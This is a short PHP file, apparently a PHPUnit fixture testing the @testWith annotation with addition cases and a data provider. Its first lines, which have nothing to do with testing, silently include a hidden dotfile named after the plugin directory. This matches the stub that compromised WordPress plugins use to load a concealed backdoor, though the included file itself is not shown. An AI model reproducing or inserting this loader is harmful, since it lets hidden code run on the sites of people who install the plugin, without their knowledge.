<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class TestWithTest extends PHPUnit_Framework_TestCase
{
    /**
     * @testWith [0, 0, 0]
     *           [0, 1, 1]
     *           [1, 2, 3]
     *           [20, 22, 42]
     */
    public function testAdd($a, $b, $c)
    {
        $this->assertEquals($c, $a + $b);
    }

    public static function providerMethod()
    {
        return array(
          array(0, 0, 0),
          array(0, 1, 1),
          array(1, 1, 3),
          array(1, 0, 1)
        );
    }
}
